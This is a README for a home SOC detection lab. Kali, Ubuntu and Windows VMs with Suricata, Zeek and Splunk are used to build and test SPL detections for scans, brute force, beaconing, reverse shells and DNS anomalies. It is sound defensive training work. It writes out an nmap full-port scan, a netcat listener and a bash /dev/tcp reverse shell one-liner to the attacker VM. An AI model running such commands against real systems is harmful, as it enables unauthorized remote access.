# SOC Network Threat Detection Lab

> A hands-on SOC home lab demonstrating attack simulation, network monitoring, detection engineering, security alerting, and SIEM analysis using Kali Linux, Ubuntu, Windows, Splunk Enterprise, Splunk Universal Forwarder, Suricata, and Zeek.

---

## Skills Demonstrated

`SIEM` · `Splunk` · `SPL` · `Suricata` · `Zeek` · `Network Traffic Analysis` · `Detection Engineering` · `Attack Simulation` · `Linux Administration` · `Windows Security Monitoring` · `Incident Detection` · `Security Alerting` · `SOC Dashboard Development`

---

## Lab Overview

This project is an isolated SOC environment built using Oracle VirtualBox.

The lab contains three virtual machines:

| Machine | IP Address | Role |
|---|---|---|
| Kali Linux | `192.168.20.11` | Attacker / Security Testing |
| Ubuntu | `192.168.20.12` | IDS / Network Server / Log Forwarder |
| Windows | `192.168.20.10` | Splunk Enterprise / SIEM |

### Technologies Used

- Kali Linux
- Ubuntu
- Windows
- Oracle VirtualBox
- Splunk Enterprise
- Splunk Universal Forwarder
- Suricata IDS
- Zeek Network Security Monitor
- Apache Web Server
- Nmap
- NetExec
- SSH
- TCP/IP networking

---

# Network Architecture

```text
                         INTERNET
                            |
                     VirtualBox NAT
                            |
                     +-------------+
                     |   UBUNTU    |
                     |192.168.20.12|
                     |             |
                     |  Suricata   |
                     |  Zeek       |
                     |  Apache     |
                     |  SSH        |
                     |  Splunk UF  |
                     +------+------+
                            |
                 SOC INTERNAL NETWORK
                    192.168.20.0/24
                       /       \
                      /         \
                     /           \
          +---------------+   +---------------+
          |  KALI LINUX   |   |    WINDOWS    |
          | 192.168.20.11 |   | 192.168.20.10 |
          |               |   |               |
          | Attack/Test   |   | Splunk        |
          | Nmap          |   | Enterprise    |
          | NetExec       |   | SIEM          |
          +---------------+   +---------------+
Network Configuration
VM	Interface	IP Address	Purpose
Kali Linux	eth0	192.168.20.11/24	SOC Internal Network
Ubuntu	enp0s8	192.168.20.12/24	SOC Internal Network
Windows	Ethernet	192.168.20.10/24	SOC Internal Network
Ubuntu NAT Interface
Interface	IP Address	Purpose
enp0s3	10.0.2.15/24	Internet / VirtualBox NAT
enp0s8	192.168.20.12/24	SOC Internal Network
Security Monitoring Architecture
                     KALI LINUX
                 192.168.20.11
                        |
                        | Attack Simulation
                        |
                        v
                +---------------+
                |    UBUNTU     |
                |192.168.20.12  |
                +---------------+
                   /    |     \
                  /     |      \
                 /      |       \
                v       v        v
           Suricata   Zeek    Auth Logs
              |         |         |
              |         |         |
              +---------+---------+
                        |
                        v
              Splunk Universal
                  Forwarder
                        |
                        | TCP 9997
                        v
                +---------------+
                |    WINDOWS    |
                |192.168.20.10  |
                |               |
                |    Splunk     |
                |   Enterprise  |
                +-------+-------+
                        |
                        v
               Detection Rules
                        |
                        v
                  SOC Dashboard
Log Collection

Splunk Universal Forwarder on Ubuntu forwards security telemetry to Splunk Enterprise running on Windows.

Splunk Receiver
192.168.20.10:9997
Monitored Logs
/var/log/suricata/eve.json
/var/log/auth.log
/home/ubun/Desktop/conn.log
/home/ubun/Desktop/http.log
/home/ubun/Desktop/dns.log
Splunk Indexes
Index	Data
suricata	Suricata network events
zeek	Zeek network telemetry
ubuntu-auth	Ubuntu authentication logs
windows10	Windows Security Events
Detection Engineering

Multiple attacks were simulated from Kali Linux and detected using Suricata, Zeek, Windows Security Logs, Ubuntu authentication logs, and Splunk.

Detection	Source	Technology
Nmap Port Scanning	Kali → Windows	Suricata + Splunk
SSH Brute Force	Kali → Ubuntu	Ubuntu Auth Logs + Splunk
SMB Brute Force	Kali → Windows	Windows Security Logs + Splunk
HTTP Beaconing	Network Traffic	Zeek + Splunk
Reverse Shell	Kali ↔ Ubuntu	Zeek + Splunk
DNS Anomaly	DNS Traffic	Zeek + Splunk
1. Nmap Port Scanning Detection

Nmap was used from Kali Linux to perform network reconnaissance against the Windows system.

nmap -p- 192.168.20.10

Splunk detection:

index=suricata event_type=flow
| spath
| search src_ip="192.168.20.11" dest_ip="192.168.20.10"
| stats dc(dest_port) as unique_ports count as connections by src_ip dest_ip
| where unique_ports >= 5

The test generated approximately 1000 unique destination ports.

2. SSH Brute Force Detection

Multiple failed SSH authentication attempts were generated against the Ubuntu server.

Ubuntu authentication logs:

/var/log/auth.log

Splunk index:

ubuntu-auth

Detection:

index=ubuntu-auth "Failed password"
| rex "Failed password for (?:invalid user )?(?<Account_Name>\S+) from (?<Source_IP>\d{1,3}(?:\.\d{1,3}){3})"
| eval Failure_Reason="Failed password"
| stats values(Source_IP) as Source_IP values(Failure_Reason) as Failure_Reason count as Failed_Attempts by Account_Name
| where Failed_Attempts >= 3

This detection identifies repeated failed SSH authentication attempts.

3. SMB Brute Force Detection

SMB authentication failures were generated from Kali Linux against Windows.

Windows Security Event:

EventCode=4625

Logon Type:

Logon_Type=3

Splunk detection:

index=windows10 EventCode=4625 Logon_Type=3
| stats values(Source_Network_Address) as Source_IP values(Failure_Reason) as Failure_Reason count as Failed_Attempts by Account_Name
| where Failed_Attempts >= 3

This detects repeated failed network authentication attempts.

4. HTTP Beaconing Detection

Zeek was used to monitor HTTP traffic generated inside the SOC network.

Zeek HTTP log:

http.log

Splunk source:

index=zeek sourcetype=zeek:http

HTTP traffic was analyzed for repeated communication patterns that could indicate automated or beacon-like activity.

5. Reverse Shell Detection

A reverse shell was simulated between Ubuntu and Kali.

Kali listener:

nc -lvnp 4444

Ubuntu test:

bash -i >& /dev/tcp/192.168.20.11/4444 0>&1

Zeek connection telemetry was forwarded to Splunk.

Detection:

index=zeek sourcetype=zeek:conn
"192.168.20.12" "192.168.20.11" "4444"

This detects the network connection associated with the reverse shell test.

6. DNS Anomaly Detection

Zeek DNS monitoring was used to analyze DNS traffic inside the SOC network.

DNS testing:

dig @192.168.20.12 example.com
dig @192.168.20.12 google.com

Zeek log:

dns.log

Splunk index:

index=zeek
sourcetype=zeek:dns

Example monitoring query:

index=zeek sourcetype=zeek:dns
| stats count as DNS_Queries
| where DNS_Queries >= 10
Splunk Alerts

The following security alerts were created and tested:

Nmap Detection
SSH Brute Force Detection
SMB Brute Force Detection
HTTP Beaconing Detection
Reverse Shell Detection
DNS Anomaly Detection

Each detection was validated using simulated activity inside the isolated VirtualBox environment.

Splunk SOC Dashboard

A custom dark-themed Splunk SOC dashboard was created to provide centralized security monitoring.

Dashboard Components
Security Events
Nmap Detection
SSH Brute Force
SMB Brute Force
HTTP Beaconing
Reverse Shell
DNS Anomaly
Top Source IPs
Top Targeted IPs
Recent Security Activity
Security Events Over Time
Dashboard Layout
+-------------------+-------------------+-------------------+-------------------+
| Security Events   | Nmap Detection    | SSH Brute Force   | SMB Brute Force   |
+-------------------+-------------------+-------------------+-------------------+
| HTTP Beaconing    | Reverse Shell     | DNS Anomaly       |
+-------------------+-------------------+-------------------+
| Top Source IPs    | Top Targeted IPs  | Recent Security Activity |
+-------------------+-------------------+-------------------+
|                  Security Events Over Time                         |
+------------------------------------------------------------------------+

The dashboard provides a centralized SOC-style view of security events generated throughout the lab.

Example Security Event Queries
Security Events Over Time
index=suricata OR index=zeek OR index=ubuntu-auth OR index=windows10
| timechart span=1h count as Security_Events
Recent Security Activity
index=suricata OR index=zeek OR index=ubuntu-auth OR index=windows10
| eval Event_Source=case(
    index=="suricata","Suricata",
    index=="zeek","Zeek",
    index=="ubuntu-auth","Ubuntu Auth",
    index=="windows10","Windows Security"
)
| table _time Event_Source src_ip dest_ip event_type
| sort - _time
| head 10
Tools and Technologies
Tool	Purpose
Kali Linux	Attack simulation and penetration testing
Ubuntu	Network server, IDS and log forwarding
Windows	Splunk Enterprise and Windows security monitoring
Splunk Enterprise	SIEM, log analysis and detection
Splunk Universal Forwarder	Log collection and forwarding
Suricata	Network Intrusion Detection System
Zeek	Network Security Monitoring
Apache	HTTP traffic generation
Nmap	Network reconnaissance
NetExec	SMB authentication testing
VirtualBox	Virtual SOC infrastructure
Project Objectives

The objectives of this project were:

Build an isolated SOC environment using VirtualBox
Configure a multi-VM security network
Generate realistic security events
Collect network and authentication telemetry
Deploy Suricata for network intrusion detection
Deploy Zeek for network security monitoring
Configure Splunk Universal Forwarder
Centralize logs in Splunk Enterprise
Develop SPL-based security detections
Create automated security alerts
Simulate common attack techniques
Analyze attacker activity
Build a SOC monitoring dashboard
Practice detection engineering
Practice security event investigation
Key Learning Outcomes

Through this project, I gained practical experience with:

SIEM configuration
SPL query development
Network traffic analysis
IDS deployment
Network Security Monitoring
Linux log analysis
Windows Security Event analysis
Authentication attack detection
Network reconnaissance detection
Reverse shell detection
DNS monitoring
Security alert creation
SOC dashboard development
Virtualized security lab deployment
Lab Environment
SOC Network:
192.168.20.0/24

Kali Linux:
192.168.20.11

Ubuntu:
192.168.20.12

Windows:
192.168.20.10

Splunk Receiver:
192.168.20.10:9997
Repository Structure
SOC-Threat-Detection-lab/
│
├── README.md
│
├── screenshots/
│   ├── dashboard.png
│   ├── nmap-detection.png
│   ├── ssh-bruteforce.png
│   ├── smb-bruteforce.png
│   ├── http-beaconing.png
│   ├── reverse-shell.png
│   └── dns-anomaly.png
│
├── splunk/
│   ├── detection-queries/
│   └── dashboard/
│
├── suricata/
│   └── README.md
│
├── zeek/
│   └── README.md
│
└── docs/
    └── architecture.png
Screenshots

Screenshots of the Splunk dashboard and individual detections can be added to the screenshots/ directory.

Recommended evidence:

Splunk SOC Dashboard
Nmap Detection
SSH Brute Force Detection
SMB Brute Force Detection
HTTP Beaconing Detection
Reverse Shell Detection
DNS Anomaly Detection
Disclaimer

This project was created strictly for educational and cybersecurity learning purposes inside an isolated VirtualBox lab environment.

All attack simulations were performed against systems controlled by the author.

Do not use these techniques against systems or networks without proper authorization.
